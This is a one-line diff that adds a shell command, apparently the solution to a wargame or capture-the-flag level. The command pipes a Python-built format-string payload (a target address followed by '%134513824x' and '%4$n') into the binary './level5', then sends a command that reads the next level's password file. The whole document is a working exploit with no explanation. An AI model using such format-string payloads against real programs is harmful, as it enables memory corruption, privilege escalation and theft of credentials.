@@ -1,0 +1,1 @@
+`(python -c 'print "\xa4\x84\x04\x08" + "%134513824x" + "%4$n"' ; echo "cat /home/user/level6/.pass") | ./level5`
